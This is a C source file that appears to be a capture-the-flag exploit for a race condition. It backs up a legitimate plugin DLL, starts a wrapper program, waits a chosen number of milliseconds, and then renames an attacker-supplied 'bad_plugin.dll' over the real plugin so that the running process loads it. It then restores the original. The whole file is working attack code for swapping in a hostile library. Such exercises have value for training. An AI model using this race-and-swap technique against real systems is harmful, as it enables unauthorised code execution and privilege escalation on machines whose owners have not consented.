#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


#define BUF_SIZE 1024

void copy_file(char* src, char* dst) {
    int inputFd, outputFd, openFlags;
    mode_t filePerms;
    ssize_t numRead;
    char buf[BUF_SIZE];

        /* Open input and output files */

    inputFd = open(src, O_RDONLY);
    if (inputFd == -1)
        printf("[-] Error open file %s\n", src);

    openFlags = O_CREAT | O_WRONLY | O_TRUNC;
    filePerms = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP |
                S_IROTH | S_IWOTH;      /* rw-rw-rw- */
    outputFd = open(dst, openFlags, filePerms);
    if (outputFd == -1)
        printf("[-] Error open file %s\n", dst);

    /* Transfer data until we encounter end of input or an error */
    while ((numRead = read(inputFd, buf, BUF_SIZE)) > 0)
        if (write(outputFd, buf, numRead) != numRead)
            printf("write() returned error or partial write occurred\n");
    if (numRead == -1)
        printf("[-] Read failed\n");

    if (close(inputFd) == -1)
        printf("[-] Close Input failed\n");
    if (close(outputFd) == -1)
        printf("[-] Close Output failed\n");
}

int main (int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: ./race <milliseconds sleep>");
        return -1;
    }

    int to_sleep_ms = strtol(argv[1], NULL, 10);
    

    printf("[+] Starting exploit\n");
    printf("[+] Creating backup of /home/ctf/bin/plugins/BadProcessKillerPlugin.dll\n");


    copy_file("/home/ctf/bin/plugins/BadProcessKillerPlugin.dll", "/tmp/backup.dll");
    copy_file("/home/ctf/bad_plugin.dll", "/home/ctf/bad_plugin_copy.dll");

    struct timespec ts;
    ts.tv_sec = to_sleep_ms / 1000;
    ts.tv_nsec = (to_sleep_ms % 1000) * 1000000;

    printf("[+] Starting runner\n");
    FILE* p = popen("/home/ctf/run_wrapper","r");
    if( p == NULL)
    {
        printf("Unable to open process\n");
        return(1);
    }

    nanosleep(&ts, NULL);
    
    int ret = rename("/home/ctf/bad_plugin.dll", "/home/ctf/bin/plugins/BadProcessKillerPlugin.dll");
    
    printf("[+] Waiting for 2 seconds\n");
    ts.tv_sec = 2;
    ts.tv_nsec = 0;

    nanosleep(&ts, NULL);

    printf("[+] Restoring backup\n");
    rename("/tmp/backup.dll", "/home/ctf/bin/plugins/BadProcessKillerPlugin.dll");
    copy_file("/home/ctf/bad_plugin_copy.dll", "/home/ctf/bad_plugin.dll");

    printf("[+] Done!\n");
    
    return(0);
}